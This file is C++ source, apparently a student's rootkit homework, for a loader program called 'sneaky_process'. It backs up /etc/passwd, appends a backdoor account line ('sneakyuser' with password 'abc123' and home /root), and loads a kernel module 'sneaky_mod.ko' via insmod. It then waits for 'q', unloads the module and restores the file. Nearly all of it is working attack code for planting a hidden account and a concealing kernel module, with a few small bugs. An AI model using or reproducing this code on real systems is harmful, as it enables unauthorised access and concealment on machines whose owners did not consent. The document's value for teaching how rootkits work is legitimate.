#include <fstream>
#include <iostream>
//#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
//#include <linux/moduleparam.h>
#include <linux/stat.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
// int pid = getpid();
// module_param(pid, int, 0);
// Couldn't get this part to work yet.
using namespace std;
bool insert_line(const char *original_passwd, const char *temp_passwd) {
  // Copy file to temp file
  ifstream src(original_passwd, ios::out);
  ofstream dest(temp_passwd, ios::out);
  if (!src.good() || !dest.good()) {
    cout << "Issue w/ initial streams" << endl;
    return false;
  }
  dest << src.rdbuf();
  // Insert sneaky line to the end of original
  ofstream insert_src(original_passwd, ofstream::out | ofstream::app);
  insert_src << "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash" << endl;
  return true;
}
bool restore_passwd(const char *original_passwd, const char *temp_passwd) {
  // Now, do the same thing, but other way around. Trunc is wanted this time.
  ifstream temp(temp_passwd, ios::out);
  ofstream original(original_passwd, ios::out);
  original << temp.rdbuf();
  return true;
}

void sneaky_process(void) {
  printf("sneaky_process pid = %d\n", getpid());
  const char *original_passwd = "/etc/passwd";
  const char *temp_passwd = "/tmp/passwd";

  // Calling w/ temp values for now, before I crash it again :^)
  // const char *original_passwd = "/home/bg127/homework5-kit/test_src.txt";
  // const char *temp_passwd = "/home/bg127/homework5-kit/test_dst.txt";
  if (!insert_line(original_passwd, temp_passwd)) {
    return;
  }
  const char *insmod_command =
      "insmod sneaky_mod.ko"; // Change this w/ insmod command after its done
  system(insmod_command);     // Don't need to wait after this

  cout << "Looping until 'q' is received now" << endl;
  char c = 'a';
  while (c != 'q') { // Should be enough to loop no?
    cin >> c;
  }

  const char *rmmod_command = "rmmod sneaky_mod";
  system(rmmod_command);

  restore_passwd(original_passwd, temp_passwd);
}

int main() {
  sneaky_process();
  return EXIT_SUCCESS;
}
